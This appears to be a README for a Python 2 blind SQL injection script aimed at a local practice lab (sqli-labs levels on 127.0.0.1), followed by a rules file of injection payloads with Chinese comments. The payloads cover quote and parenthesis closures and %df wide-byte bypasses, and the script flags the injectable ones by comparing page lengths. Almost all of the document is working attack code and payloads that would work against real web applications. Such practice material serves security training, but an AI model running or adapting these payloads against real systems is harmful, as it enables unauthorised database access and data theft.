# Blind-Injection-Script

```
#!/usr/bin/env python
# encoding:utf8
import requests

for levelNumebr in range(1,66):
	print "第",levelNumebr,"关"
	rules = open('rules', 'r')
	currentQuery = "1" # 正确的查询参数
	wrongQuery = "0" # 正确的查询参数
	baseUrl = "http://127.0.0.1/Less-" + str(levelNumebr) + "/?id="
	url = baseUrl + currentQuery
	contentLength = len(requests.get(url).text)
	print "正常返回长度为 : ",contentLength
	for line in rules:
		if line.startswith("#"):
			continue
		if line == "\r\n":
			continue
		line = line.replace("\r","")
		line = line.replace("\n","")
		startTemp = line.split("()")[0]
		endTemp = line.split("()")[1]
		payload1 = startTemp + "(" + wrongQuery + ")" + endTemp
		testUrl1 = baseUrl + payload1
		payload2 = startTemp + "(" + currentQuery + ")" + endTemp
		testUrl2 = baseUrl + payload2
		content1 = requests.get(testUrl1).text
		content1 = content1.replace(payload1,wrongQuery)
		len1 = len(content1)
		content2 = requests.get(testUrl2).text
		content2 = content2.replace(payload2,currentQuery)
		len2 = len(content2)
		if (len1 != contentLength) and (len2 == contentLength):
			print baseUrl + line
```
```
# 注意这里并没有把空格进行URL编码 , 也就是说Requests库在发送的时候可能已经进行了一次编码
# 之所以这么做是因为有的时候 , Payload可能会显示在页面上
# 这样的话 , 可能对我们判断是否注入成功有影响
# 因此想到一个解决方案是将返回页面中的Payload替换为最开始获取正确的页面的时候的参数
# 这样一来 , 就基本上可以解决这个问题
# 这样的话 , 可以通过判断页面的长度来判断是否注入成功
# 如下语句 : 如果返回正常 , 说明猜测成功
# 但是这里还会有一个问题 , 例如29关
# 第29关是将URL中符号转换成了URL编码然后显示出来
# 这个问题暂时还没有解决
# 如果还是按照刚才的思路的话 , 就是将Payload中的特殊字符进行URL编码
# 然后再对content进行替换 , 现在有点忙 , 晚上回来试试
0|()-- 
0'|()-- 
0"|()-- 
0)|()-- 
0')|()-- 
0")|()-- 
0))|()-- 
0'))|()-- 
0"))|()-- 
0)))|()-- 
#####################################
# 当单引号被过滤(去掉)
0%df'|()-- 
0%df')|()-- 
0%df'))|()-- 
#####################################
# 当双引号被过滤
0%df"|()-- 
0%df")|()-- 
0%df"))|()-- 
#####################################
0'|()|''='1-- 
0"|()|''='1-- 
0)|()|''='1-- 
0')|()|''='1-- 
0")|()|''='1-- 
0))|()|''='1-- 
0'))|()|''='1-- 
0"))|()|''='1-- 
0)))|()|''='1-- 
#####################################
0'||()||''='1
```
